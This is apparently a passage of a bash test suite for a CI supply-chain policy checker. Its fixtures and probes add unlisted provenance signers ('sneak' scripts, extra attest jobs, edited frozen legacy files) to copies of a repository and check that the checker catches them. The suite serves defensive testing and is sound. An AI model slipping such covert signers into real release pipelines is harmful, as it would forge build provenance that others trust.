d=$(mk t_blob); printf 'jobs:\n  b:\n    steps:\n      - run: cosign attest-blob --yes --statement prov.json --bundle b.json\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 cosign attest-blob with no literal non-provenance type is provenance (fail closed)" tree "$d"
d=$(mk t_atvar); printf 'jobs:\n  b:\n    steps:\n      - run: cosign attest --yes --type "$T" --predicate p.json "$IMG"\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 cosign attest with a shell-variable type is provenance (fail closed)" tree "$d"
d=$(mk t_quote); printf 'jobs:\n  b:\n    steps:\n      - run: echo "step #1"; cosign sign --yes "$IMG"\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 a '#' inside quotes does not hide a signer on the same line (echo \"step #1\"; cosign sign)" tree "$d"
d=$(mk t_wra); printf 'jobs:\n  b:\n    steps:\n      - uses: testifysec/witness-run-action@%s # v1\n' "$sha" > "$d/.github/workflows/scan.yml"
expect caught "AC1 testifysec/witness-run-action is a provenance signer (its attestors cannot be resolved statically)" tree "$d"
d=$(mk t_attml); printf 'jobs:\n  b:\n    steps:\n      - uses: actions/attest@%s # v4\n        with:\n          subject-path: dist/x\n          predicate-type: https://slsa.dev/provenance/v1\n' "$sha" > "$d/.github/workflows/scan.yml"
expect caught "AC1 actions/attest with the SLSA predicate-type on a later line is provenance (round 5)" tree "$d"
d=$(mk t_attvar); printf 'jobs:\n  b:\n    steps:\n      - uses: actions/attest@%s # v4\n        with:\n          predicate-type: ${{ inputs.t }}\n' "$sha" > "$d/.github/workflows/scan.yml"
expect caught "AC1 actions/attest with an expression predicate-type is provenance (fail closed)" tree "$d"
d=$(mk t_attok); printf 'jobs:\n  b:\n    steps:\n      - uses: actions/attest@%s # v4\n        with:\n          predicate-type: https://spdx.dev/Document\n' "$sha" > "$d/.github/workflows/scan.yml"
python3 - "$d" <<'PY'
import json, sys
f = sys.argv[1] + "/.github/policy/chain-signers.json"; j = json.load(open(f))
j["signers"].append({"file": "scan.yml", "tool": "actions/attest", "reason": "SBOM attestation of the image (rule 55)"}); json.dump(j, open(f, "w"))
PY
expect ok "AC1 actions/attest with a literal non-provenance predicate-type is fine when listed with a reason" tree "$d"
d=$(mk t_wvar); printf 'jobs:\n  b:\n    steps:\n      - run: witness run --step build -a "$ATT" -- ./bin/build.sh\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 witness run -a \"\$ATT\" (variable attestor list) is provenance (fail closed)" tree "$d"
d=$(mk t_wexpr); printf 'jobs:\n  b:\n    steps:\n      - run: witness run --step build -a ${{ inputs.att }} -- ./bin/build.sh\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 witness run -a \${{ expression }} is provenance (fail closed)" tree "$d"
d=$(mk t_wfold); printf 'jobs:\n  b:\n    steps:\n      - run: >-\n          witness run --step build\n          -a slsa -- ./bin/build.sh\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 witness run with -a slsa on the next line of a folded scalar" tree "$d"
d=$(mk t_wnext); printf 'jobs:\n  b:\n    steps:\n      - run: |\n          witness run --step build -a\n          slsa -- ./bin/build.sh\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 witness run -a with its value on the next line" tree "$d"
d=$(mk t_wcfg2); printf 'jobs:\n  b:\n    steps:\n      - run: witness run --step build -a product -c witness.yaml -- ./bin/build.sh\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 witness run -a product -c cfg.yaml (the config file can add slsa)" tree "$d"
d=$(mk t_twotype); printf 'jobs:\n  b:\n    steps:\n      - run: cosign attest --yes --type spdx --type slsaprovenance1 --predicate p.json "$IMG"\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 cosign attest with repeated --type: the first does not hide the second" tree "$d"
d=$(mk t_blobprov); printf 'jobs:\n  b:\n    steps:\n      - run: cosign sign-blob --yes provenance.intoto.jsonl --bundle b.json\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 cosign sign-blob of a provenance blob is provenance" tree "$d"
d=$(mk t_sigpy); printf 'jobs:\n  b:\n    steps:\n      - run: python3 -m sigstore attest --predicate p.json dist/x\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 the python sigstore CLI attest is a provenance signer" tree "$d"
d=$(mk t_notation); printf 'jobs:\n  b:\n    steps:\n      - run: notation sign "$IMG"\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 notation sign is a known signer that must be listed" tree "$d"
d=$(mk t_intoto); printf 'jobs:\n  b:\n    steps:\n      - run: in-toto-run --step-name build -- ./x\n' > "$d/.github/workflows/scan.yml"
expect caught "AC1 in-toto-run is a known signer that must be listed" tree "$d"
d=$(mk t_new); cp "$good" "$d/.github/workflows/stage-extra.yml"
expect caught "AC1 a second new workflow file" tree "$d"
d=$(mk t_noreason); sed -i.bak 's/"reason":"CI patch tag (REQ-REL-009-AC5)"/"reason":" "/' "$d/.github/policy/chain-signers.json"
expect caught "AC1 a listed signer with no reason" tree "$d"
d=$(mk t_nolist); rm "$d/.github/policy/chain-signers.json"
expect caught "AC1 no chain-signers.json" tree "$d"
# 003-AC5: only release.yml calls stage-sign.yml and no stage calls a stage (a stage that calls another stage gets that stage's SAN: spike (b) case 5)
d=$(mk c_good); printf 'jobs:\n  s:\n    uses: ./.github/workflows/stage-sign.yml\n  b:\n    uses: ./.github/workflows/stage-build.yml\n' > "$d/.github/workflows/release.yml"
expect ok "003-AC5 fixture: release.yml calls every stage file" calls "$d"
d=$(mk c_nested); printf 'jobs:\n  x:\n    uses: ./.github/workflows/stage-sign.yml\n' > "$d/.github/workflows/stage-build.yml"
expect caught "003-AC5 stage-build.yml calls stage-sign.yml (nested call)" calls "$d"
d=$(mk c_second); printf 'on: push\njobs:\n  x:\n    uses: ./.github/workflows/stage-sign.yml\n' > "$d/.github/workflows/ci.yml"
expect caught "003-AC5 a second workflow (ci.yml) calls stage-sign.yml" calls "$d"
d=$(mk c_remote); printf 'jobs:\n  x:\n    uses: fosterstack/cache/.github/workflows/stage-sign.yml@%s\n' "$sha" > "$d/.github/workflows/auditor.yml"
expect caught "003-AC5 a second workflow calls stage-sign.yml by repository path and digest" calls "$d"
d=$(mk c_step); printf 'jobs:\n  x:\n    steps:\n      - uses: ./.github/workflows/stage-verify.yml\n' > "$d/.github/workflows/stage-promote.yml"
expect caught "003-AC5 a step-level reference to a stage file from another stage" calls "$d"
d=$(mk c_yaml); printf 'jobs:\n  x:\n    uses: ./.github/workflows/stage-sign.yml\n' > "$d/.github/workflows/other.yaml"
expect caught "003-AC5 a .yaml workflow calling stage-sign.yml" calls "$d"
d=$(mk c_scan); printf 'on: push\njobs:\n  x:\n    uses: ./.github/workflows/stage-build.yml\n' > "$d/.github/workflows/scan.yml"
expect ok "003-AC5 a non-stage workflow (scan.yml) may still call stage-build.yml" calls "$d"
# ---- the real repository ----------------------------------------------------------------------------------------------------------------
# Judged over a copy of the TRACKED files of .github/ and bin/ (as CI sees them), never the working directory, which suites running in
# parallel may write to (bin/__pycache__).
tracked_copy() {  # tracked_copy NAME [REPO] -> a copy of the tracked files of .github/ and bin/ of REPO (default: the real tree)
  local d="$work/tree-$1"; rm -rf "$d"; mkdir -p "$d"
  ( cd "${2:-$root}" && git ls-files -z -- .github bin | tar --null -T - -cf - ) | tar -xf - -C "$d"; echo "$d"; }
# a tracked file deleted in the working tree would make the copy silently partial: fail clearly instead (CI checks out every tracked file)
gone=$(cd "$root" && git ls-files --deleted -- .github bin)
if [ -n "$gone" ]; then echo "FAIL tracked file(s) deleted in the working tree, the real-tree cases cannot run: $(echo $gone | head -c 300)"; exit 1; fi
REAL=$(tracked_copy real)
expect ok "the real stage-sign.yml passes the Sign judge" sign "$REAL/.github/workflows/stage-sign.yml"
expect ok "the real stage-build.yml's signing steps take nothing from a secret" build "$REAL/.github/workflows/stage-build.yml"
expect ok "the real tree: only release.yml calls stage-sign.yml and no stage calls a stage (003-AC5; green already: scan.yml and main-candidate-rescan.yml are non-stage callers)" calls "$REAL"
# FROZEN LEGACY FILES (REQ-CHAIN-003 notes): the eleven legacy stage files PRs 2-4 rewrite on chain-v030 are listed with the sha256 of their
# bytes in .github/policy/legacy-stage-files.json; the tree judge leaves out the findings OF a listed file whose bytes match (it still reads
# them to see which scripts they run), and judges everything else in full. So the real tree is an ordinary `expect ok`. A file whose bytes
# differ is judged in full; when the last legacy file is rewritten, deleting the list leaves this same case judging the whole tree.
expect ok "the real tree: only stage-sign.yml is new and only it signs provenance (the eleven frozen legacy stage files left out by sha256)" tree "$REAL"
# every probe is a copy of the real tree with ONE change; the tree judge must fail it and name the changed file
SIGN_JOB='  extra-attest:\n    runs-on: ubuntu-24.04\n    permissions:\n      id-token: write\n      attestations: write\n    steps:\n      - uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.0.0\n        with:\n          subject-path: x\n'
probe() {  # probe NAME TEXT-THE-FINDINGS-MUST-NAME LABEL EDIT(shell, run in the copy)
  local d out rc=0; d=$(tracked_copy "probe-$1")
  ( cd "$d" && eval "$4" ) || echo "probe $1: the edit did not apply"
  out=$(judge tree "$d") || rc=$?
  if [ "$rc" != 0 ] && grep -F -q -- "$2" <<< "$out"; then pass=$((pass + 1)); echo "ok   real-tree probe: $3 is caught (${out:0:140})"
  else failn=$((failn + 1)); echo "FAIL real-tree probe let through $3 (or did not name $2): rc=$rc ${out:0:300}"; fi; }
rehash() {  # rehash PATH: refresh PATH's sha256 in chain-scripts.json of the copy (the probe edits a listed script "properly")
  python3 -c 'import hashlib,json,sys; p=".github/policy/chain-scripts.json"; d=json.load(open(p))
for r in d["scripts"]:
    if r["path"] == sys.argv[1]: r["sha256"] = hashlib.sha256(open(sys.argv[1],"rb").read()).hexdigest(); r.update(dict(a.split("=",1) for a in sys.argv[2:]))
json.dump(d, open(p,"w"), indent=1)' "$@"; }
probe build    stage-build.yml      "a second provenance signer job in stage-build.yml"     "printf '$SIGN_JOB' >> .github/workflows/stage-build.yml"
probe image    stage-image.yml      "a second provenance signer job in stage-image.yml"     "printf '$SIGN_JOB' >> .github/workflows/stage-image.yml"
probe sneak    bin/sneak.sh         "stage-admission.yml running an unlisted bin/sneak.sh that signs provenance" \
  "printf '#!/usr/bin/env bash\ncosign attest --type slsaprovenance --predicate p.json img\n' > bin/sneak.sh; printf '  sneak:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: bash bin/sneak.sh\n' >> .github/workflows/stage-admission.yml"
probe cisneak  bin/ci-sneak.sh      "ci.yml (a non-stage workflow) running an unlisted new bin/ci-sneak.sh that signs provenance" \
  "printf '#!/usr/bin/env bash\ncosign attest --type slsaprovenance --predicate p.json img\n' > bin/ci-sneak.sh; printf '  sneak:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: bash bin/ci-sneak.sh\n' >> .github/workflows/ci.yml"
probe supply   supply-chain.yml     "a provenance signer job in supply-chain.yml"           "printf '$SIGN_JOB' >> .github/workflows/supply-chain.yml"
probe ci       ci.yml               "a provenance signer job in ci.yml"                     "printf '$SIGN_JOB' >> .github/workflows/ci.yml"
probe composite .github/actions/probe "a provenance signer in a new composite action"         "mkdir -p .github/actions/probe; printf 'name: probe\nruns:\n  using: composite\n  steps:\n    - uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.0.0\n      with:\n        subject-path: x\n' > .github/actions/probe/action.yml"
probe comment  "legacy file changed" "a harmless comment added to a legacy file (it is then judged in full)" "printf '# a comment\n' >> .github/workflows/stage-verify.yml"
# Opus r-frozen probes: a LISTED script that a frozen file runs turned into a provenance signer (its row and sha256 updated), and unlisted
# scripts that frozen files run (only listed scripts were scanned before)
probe hoststep bin/chain-hostile-step.sh "bin/chain-hostile-step.sh (run by frozen stage-build.yml) made a provenance signer, its row and sha256 updated" \
  "printf 'cosign attest --type slsaprovenance --predicate p.json img\n' >> bin/chain-hostile-step.sh; rehash bin/chain-hostile-step.sh signs=provenance"
probe vexforms bin/vex-forms.py     "a provenance signer added to bin/vex-forms.py (unlisted, run by frozen stage-promote.yml)" "printf '# cosign attest --type slsaprovenance x\n' >> bin/vex-forms.py"
probe patchdec bin/patch-decide.py  "a provenance signer added to bin/patch-decide.py (unlisted)" "printf 'X = \"cosign attest --type slsaprovenance\"\n' >> bin/patch-decide.py"
probe agentbin .github/agent/bin/auditor-release-authz.py "a provenance signer added under .github/agent/bin" "printf '# actions/attest-build-provenance\n' >> .github/agent/bin/auditor-release-authz.py"
probe allowed  bin/check-workflow-permissions.py "an allow-listed mention file changed (its mentions are then findings)" "printf '# changed\n' >> bin/check-workflow-permissions.py"
probe extra    "not list exactly the eleven" "a twelfth path in the legacy list" \
  "python3 -c 'import json;p=\".github/policy/legacy-stage-files.json\";d=json.load(open(p));d[\"files\"].append({\"path\":\".github/workflows/ci.yml\",\"sha256\":\"0\"*64});json.dump(d,open(p,\"w\"))'"
probe outside  "outside .github/workflows/" "a legacy-list path outside .github/workflows/" \
  "python3 -c 'import json;p=\".github/policy/legacy-stage-files.json\";d=json.load(open(p));d[\"files\"][0][\"path\"]=\"bin/chain-verify.py\";json.dump(d,open(p,\"w\"))'"
probe missing  "legacy file missing: .github/workflows/stage-image.yml" "a listed legacy file that was deleted" "rm .github/workflows/stage-image.yml"
# the list is the only exclusion: with it deleted, the same judge judges the whole tree (today: red on the legacy files), with no leftover
d=$(tracked_copy nolist); rm "$d/.github/policy/legacy-stage-files.json"; rc=0; out=$(judge tree "$d") || rc=$?
[ "$rc" != 0 ] && grep -F -q "stage-build.yml signs provenance" <<< "$out" && ok_n=1 || ok_n=0
if [ "$ok_n" = 1 ]; then pass=$((pass + 1)); echo "ok   with legacy-stage-files.json deleted the same case judges the whole tree (red today on the legacy signers)"; else failn=$((failn + 1)); echo "FAIL deleting legacy-stage-files.json did not bring the legacy files back into the judge: rc=$rc ${out:0:200}"; fi
# only TRACKED files are judged: an untracked file with a signer in a working copy is not part of what CI checks out
g="$work/gitcopy"; rm -rf "$g"; cp -R "$REAL" "$g"; ( cd "$g" && git init -q . && git add -A && git -c user.name=t -c user.email=t@t -c commit.gpgsign=false commit -qm c )
printf 'cosign attest --type slsaprovenance x\n' > "$g/bin/untracked-signer.sh"
expect ok "an UNTRACKED file holding a signer is not in the tracked copy CI judges" tree "$(tracked_copy fromgit "$g")"
EXPECT=268
echo "pass=$pass fail=$failn"
if [ $((pass + failn)) != "$EXPECT" ]; then echo "FAIL case count $((pass + failn)) != expected $EXPECT (a case was skipped or added)"; exit 1; fi
[ "$failn" = 0 ]
